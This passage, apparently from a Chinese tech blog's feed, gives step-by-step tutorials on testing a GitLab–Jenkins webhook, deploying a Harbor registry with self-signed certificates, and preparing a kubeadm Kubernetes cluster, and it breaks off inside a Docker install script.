src="https://gitee.com/ljh00928/csdn/raw/master/img/276546fd9ab44bb58382021626f3b884.png" alt="img"></p><p>gitlab测试钩子状态</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/962a11f4e4c1450d8cee1548aa69720a.png" alt="img"></p><h2 id="六、测试gitlab和jenkins持续集成"><a href="#六、测试gitlab和jenkins持续集成" class="headerlink" title="六、测试gitlab和jenkins持续集成"></a>六、测试gitlab和jenkins持续集成</h2><p>gitlab修改代码提交，这里我们直接加个p标签测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">[root@gitlab212 project]# vim about.html<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> 第一次提交 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;applicable-device&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;pc,mobile&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>关于我们<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure><p>提交代码到gitlab</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">git <span class="hljs-keyword">add</span> .<br><br>git <span class="hljs-keyword">commit</span> <span class="hljs-operator">-</span>m ＂第一次提交&quot;<br><br>git push origin master<br></code></pre></td></tr></table></figure><p>jenkins观察是否自动拉取，这时候jenkins检测到gitlab分支有变动，自动拉取代码到了jenkins工作目录中了~</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/81321be1610f45fd921b4341abf05b57.png" alt="img"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">[root@jenkins211 test]# cat about.html | head -10<br>?<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span> 第一次提交 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CICD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CICD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>harbor部署</title>
    <link href="/2025/04/18/harbor%E9%83%A8%E7%BD%B2/"/>
    <url>/2025/04/18/harbor%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="一、安装docker"><a href="#一、安装docker" class="headerlink" title="一、安装docker"></a>一、安装docker</h3><p>这里我们直接使用docker脚本安装，关于脚本上一篇博文有写，感兴趣的朋友可以参考一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署docker和docker-compose <br>1.1 解压软件包<br>[root@harbor ~]# tar xf docker-docker-compose.tar.gz <br><br>1.2 安装docker和docker-compose运行时<br>[root@harbor ~]# ./install-docker.sh i<br><br>1.3 查看版本 <br>[root@harbor ~]# docker --version<br>Docker version 20.10.24, build 297e128<br>[root@harbor ~]# <br>[root@harbor ~]# docker-compose --version<br>Docker Compose version v2.23.0<br></code></pre></td></tr></table></figure><h3 id="二、安装harbor"><a href="#二、安装harbor" class="headerlink" title="二、安装harbor"></a><strong>二、安装harbor</strong></h3><h5 id="准备harbor安装包"><a href="#准备harbor安装包" class="headerlink" title="准备harbor安装包"></a><strong>准备harbor安装包</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/goharbor/harbor/tags<br></code></pre></td></tr></table></figure><h5 id="创建证书的工作目录"><a href="#创建证书的工作目录" class="headerlink" title="创建证书的工作目录"></a>创建证书的工作目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/harbor/certs/&#123;ca,harbor-server,docker-client&#125;<br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs&#x27;</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/ca&#x27;</span>  <span class="hljs-comment"># 将来存储的是自建CA证书</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/harbor-server&#x27;</span>  <span class="hljs-comment"># harbor服务端使用的证书</span><br><span class="hljs-built_in">mkdir</span>: created directory <span class="hljs-string">&#x27;/softwares/harbor/certs/docker-client&#x27;</span>  <span class="hljs-comment"># harbor客户端链接时使用的证书文件</span><br></code></pre></td></tr></table></figure><h5 id="解压软件包"><a href="#解压软件包" class="headerlink" title="解压软件包"></a>解压软件包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# tar xf harbor-offline-installer-v2.7.4.tgz -C /softwares/<br></code></pre></td></tr></table></figure><h5 id="进入到harbor证书存放目录"><a href="#进入到harbor证书存放目录" class="headerlink" title="进入到harbor证书存放目录"></a>进入到harbor证书存放目录</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor ~]# <span class="hljs-built_in">cd</span> /softwares/harbor/certs/<br></code></pre></td></tr></table></figure><h5 id="生成自建CA证书"><a href="#生成自建CA证书" class="headerlink" title="生成自建CA证书"></a>生成自建CA证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.创建CA的私钥<br>[root@harbor certs]# <span class="hljs-built_in">pwd</span><br>/softwares/harbor/certs<br>[root@harbor certs]# openssl genrsa -out ca/ca.key 4096<br><br>2 基于自建的CA私钥创建CA证书(注意，证书签发的域名范围)<br>[root@harbor certs]# openssl req -x509 -new -nodes -sha512 -days 3650 \<br> -subj <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=cherry.com&quot;</span> \<br> -key ca/ca.key \<br> -out ca/ca.crt<br><br>3 查看自建证书信息<br>[root@harbor certs]# openssl  x509 -<span class="hljs-keyword">in</span> ca/ca.crt -noout -text<br></code></pre></td></tr></table></figure><h5 id="配置harbor证书"><a href="#配置harbor证书" class="headerlink" title="配置harbor证书"></a>配置harbor证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.生成harbor服务器的私钥<br>[root@harbor certs]# openssl genrsa -out harbor-server/harbor.cherry.com.key 4096<br><br>2 harbor服务器基于私钥签发证书认证请求（csr文件），让自建CA认证<br>[root@harbor certs]# openssl req -sha512 -new \<br>    -subj <span class="hljs-string">&quot;/C=CN/ST=Beijing/L=Beijing/O=example/OU=Personal/CN=harbor.cherry.com&quot;</span> \<br>    -key harbor-server/harbor.cherry.com.key \<br>    -out harbor-server/harbor.cherry.com.csr<br>    <br>3 生成 x509 v3 的扩展文件用于认证<br><span class="hljs-built_in">cat</span> &gt; harbor-server/v3.ext &lt;&lt;-<span class="hljs-string">EOF</span><br><span class="hljs-string">authorityKeyIdentifier=keyid,issuer</span><br><span class="hljs-string">basicConstraints=CA:FALSE</span><br><span class="hljs-string">keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment</span><br><span class="hljs-string">extendedKeyUsage = serverAuth</span><br><span class="hljs-string">subjectAltName = @alt_names</span><br><span class="hljs-string"></span><br><span class="hljs-string">[alt_names]</span><br><span class="hljs-string">DNS.1=harbor.cherry.com</span><br><span class="hljs-string">EOF</span><br>             <br>4 基于 x509 v3 的扩展文件认证签发harbor server证书<br>[root@harbor certs]# openssl x509 -req -sha512 -days 3650 \<br>    -extfile harbor-server/v3.ext \<br>    -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial \<br>    -<span class="hljs-keyword">in</span> harbor-server/harbor.cherry.com.csr \<br>    -out harbor-server/harbor.cherry.com.crt<br></code></pre></td></tr></table></figure><h5 id="修改harbor的配置文件使用自建证书"><a href="#修改harbor的配置文件使用自建证书" class="headerlink" title="修改harbor的配置文件使用自建证书"></a>修改harbor的配置文件使用自建证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">注意所在路径<br>[root@harbor harbor]# <span class="hljs-built_in">pwd</span><br>/softwares/harbor<br><br>修改harbor的配置文件使用自建证书<br>[root@harbor harbor]# <span class="hljs-built_in">cp</span> harbor.yml&#123;.tmpl,&#125;<br><br>编辑harbor配置文件<br>[root@harbor harbor]# vim harbor.yml<br>...<br>hostname: harbor.cherry.com<br>https:<br>  ...<br>  certificate: /softwares/harbor/certs/harbor-server/harbor.cherry.com.crt<br>  private_key: /softwares/harbor/certs/harbor-server/harbor.cherry.com.key<br>...<br>harbor_admin_password: 1<br>...<br>data_volume: /data/harbor<br></code></pre></td></tr></table></figure><h5 id="安装harbor"><a href="#安装harbor" class="headerlink" title="安装harbor"></a>安装harbor</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@harbor harbor]# ./install.sh --with-chartmuseum<br></code></pre></td></tr></table></figure><h3 id="三、访问"><a href="#三、访问" class="headerlink" title="三、访问"></a>三、访问</h3><h5 id="Windows做hosts解析"><a href="#Windows做hosts解析" class="headerlink" title="Windows做hosts解析"></a>Windows做hosts解析</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">编辑Windowshosts文件<br>位置  C:\Windows\System32\drivers\etc\hosts<br>...<br>10.0.0.250 harbor.cherry.com<br></code></pre></td></tr></table></figure><h5 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://harbor.cherry.com<br><br>账号：admin<br>密码：1<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d7c3895e963d46c5afaf5f99865075d6.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>CICD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CICD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kubeadm 部署k8s</title>
    <link href="/2025/04/18/kubeadm-%E9%83%A8%E7%BD%B2k8s/"/>
    <url>/2025/04/18/kubeadm-%E9%83%A8%E7%BD%B2k8s/</url>
    
    <content type="html"><![CDATA[<h3 id="闲聊"><a href="#闲聊" class="headerlink" title="闲聊"></a>闲聊</h3><p>考虑了很久，打算写一篇保姆级部署从0-1构建企业级cicd流水线，把工作上面所用到的技术点分享给大家。从最k8s，harbor，jenkins，gitlab，docker的详细部署到集成。前后端流水线的构建，发布等…如果以下内容有不足的地方，请指出，我会第一时间更正。谢谢大家。</p><p>先上一下手绘导图，大致的流程图如下：<br>大致的部署流程是这样的：开发人员把做好的asp.net core项目代码通过git推送到gitlab，然后Jenkins通过 gitlab webhook （前提是配置好），自动从拉取gitlab上面拉取代码下来，然后进行build，编译、生成镜像、然后把镜像推送到Harbor仓库；然后在部署的时候通过k8s拉取Harbor上面的代码进行创建容器和服务，最终发布完成，然后可以用外网访问。<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/43ad043138325f26040323ea0ad0997c.png"></p><p>当然啦，上面只是粗略的，请看下图才更加形象。<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/bf1ac1d19937c32868663f22a7402571.png"></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>K8s 集群部署有多种方式，kubeadm 是 K8s 官方提供的集群部署工具，这种方法最为常用，简单快速，适合初学者。本文就使用 kubeadm 搭建集群演示。</p><h3 id="二、主机准备"><a href="#二、主机准备" class="headerlink" title="二、主机准备"></a>二、主机准备</h3><p>本次我们搭建一套 3 个节点的 K8s 集群，操作系统使用Ubuntu 22.04.4 LTS，配置2核4G，ip规划如下</p><table><thead><tr><th>主机名</th><th>ip地址</th><th><strong>主机配置</strong></th></tr></thead><tbody><tr><td>master231</td><td>10.0.0.231</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worker232</td><td>10.0.0.232</td><td>2核，4GiB，系统盘 20GiB</td></tr><tr><td>worker233</td><td>10.0.0.233</td><td>2核，4GiB，系统盘 20GiB</td></tr></tbody></table><h3 id="三、系统配置"><a href="#三、系统配置" class="headerlink" title="三、系统配置"></a>三、系统配置</h3><h5 id="关闭swap分区"><a href="#关闭swap分区" class="headerlink" title="关闭swap分区"></a>关闭swap分区</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapoff -a &amp;&amp; sysctl -w vm.swappiness=0  <span class="hljs-comment"># 临时关闭</span><br>sed -ri <span class="hljs-string">&#x27;/^[^#]*swap/s@^@#@&#x27;</span> /etc/fstab  <span class="hljs-comment"># 基于配置文件关闭</span><br></code></pre></td></tr></table></figure><h5 id="确保各个节点MAC地址或product-uuid唯一"><a href="#确保各个节点MAC地址或product-uuid唯一" class="headerlink" title="确保各个节点MAC地址或product_uuid唯一"></a>确保各个节点MAC地址或product_uuid唯一</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig  ens33  | grep ether | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span><br><span class="hljs-built_in">cat</span> /sys/class/dmi/id/product_uuid <br><br>温馨提示:<br>   一般来讲，硬件设备会拥有唯一的地址，但是有些虚拟机的地址可能会重复。 <br>   Kubernetes使用这些值来唯一确定集群中的节点。 如果这些值在每个节点上不唯一，可能会导致安装失败。<br></code></pre></td></tr></table></figure><h5 id="检查网络节点是否互通"><a href="#检查网络节点是否互通" class="headerlink" title="检查网络节点是否互通"></a>检查网络节点是否互通</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">简而言之，就是检查你的k8s集群各节点是否互通，可以使用ping命令来测试。<br>ping www.baidu.com -c 10<br>ping master231 -c 10<br></code></pre></td></tr></table></figure><h5 id="允许iptable检查桥接流量"><a href="#允许iptable检查桥接流量" class="headerlink" title="允许iptable检查桥接流量"></a>允许iptable检查桥接流量</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | tee /etc/modules-load.d/k8s.conf</span><br><span class="hljs-string">br_netfilter</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | tee /etc/sysctl.d/k8s.conf</span><br><span class="hljs-string">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="hljs-string">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br>sysctl --system<br></code></pre></td></tr></table></figure><h5 id="修改cgroup的管理进程"><a href="#修改cgroup的管理进程" class="headerlink" title="修改cgroup的管理进程"></a>修改cgroup的管理进程</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">所有节点修改cgroup的管理进程为systemd==乌班图默认不用修改<br>[root@master231 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@master231 ~]# <br><br>[root@worker232 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@worker232 ~]# <br><br>[root@worker233 ~]# docker info  | grep <span class="hljs-string">&quot;Cgroup Driver:&quot;</span><br> Cgroup Driver: systemd<br>[root@worker233 ~]# <br>温馨提示:<br>如果不修改cgroup的管理驱动为systemd，则默认值为cgroupfs，在初始化master节点时会失败<br></code></pre></td></tr></table></figure><h3 id="四、安装k8s管理工具"><a href="#四、安装k8s管理工具" class="headerlink" title="四、安装k8s管理工具"></a>四、安装k8s管理工具</h3><p>kubeadm：用来初始化K8S集群的工具。<br>kubelet：在集群中的每个节点上用来启动Pod和容器等。<br>kubectl：用来与K8S集群通信的命令行工具。</p><h5 id="所有节点操作"><a href="#所有节点操作" class="headerlink" title="所有节点操作"></a><strong>所有节点操作</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.K8S所有节点配置软件源<br>apt-get update &amp;&amp; apt-get install -y apt-transport-https<br>curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - <br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="hljs-string">deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main</span><br><span class="hljs-string">EOF</span><br><br>2.获取最新软件包信息<br>apt-get update<br><br>3.查看一下当前环境支持的k8s版本<br>[root@master231 ~]# apt-cache madison kubeadm<br>   kubeadm |  1.28.2-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   kubeadm |  1.28.1-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   kubeadm |  1.28.0-00 | https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 Packages<br>   <br>4.安装 kubelet kubeadm kubectl<br>apt-get -y install kubelet=1.23.17-00 kubeadm=1.23.17-00 kubectl=1.23.17-00<br><br><br>5.所有节点都要检查各组件版本 <br>kubeadm version<br>kubectl version<br>kubelet --version<br></code></pre></td></tr></table></figure><h5 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.编写docker安装脚本<br>[root@master231 docker]# <span class="hljs-built_in">cat</span> install-docker.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># auther: cherry</span><br><br><span class="hljs-comment"># 加载操作系统的变量，主要是ID变量。</span><br>. /etc/os-release<br><br><span class="hljs-comment"># DOCKER_VERSION=26.1.1</span><br>DOCKER_VERSION=20.10.24<br><span class="hljs-comment"># DOCKER_COMPOSE_VERSION=2.27.0</span><br>DOCKER_COMPOSE_VERSION=2.23.0<br>FILENAME=docker-<span class="hljs-variable">$&#123;DOCKER_VERSION&#125;</span>.tgz<br>DOCKER_COMPOSE_FILE=docker-compose-v<span class="hljs-variable">$&#123;DOCKER_COMPOSE_VERSION&#125;</span><br>URL=https://download.docker.com/linux/static/stable/x86_64<br>DOCKER_COMPOSE_URL=https://github.com/docker/compose/releases/download/v<span class="hljs-variable">$&#123;DOCKER_COMPOSE_VERSION&#125;</span>/docker-compose-linux-x86_64<br>DOWNLOAD=./download<br>BASE_DIR=/softwares<br>OS_VERSION=<span class="hljs-variable">$ID</span><br><br><br><br><br><span class="hljs-comment"># 判断是否下载了docker-compose</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">prepare</span></span>()&#123;<br>   <span class="hljs-comment"># 判断是否下载docker-compose文件</span><br>   <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span> ]; <span class="hljs-keyword">then</span><br>      wget -T 3  -t 2 <span class="hljs-variable">$&#123;DOCKER_COMPOSE_URL&#125;</span> -O <span 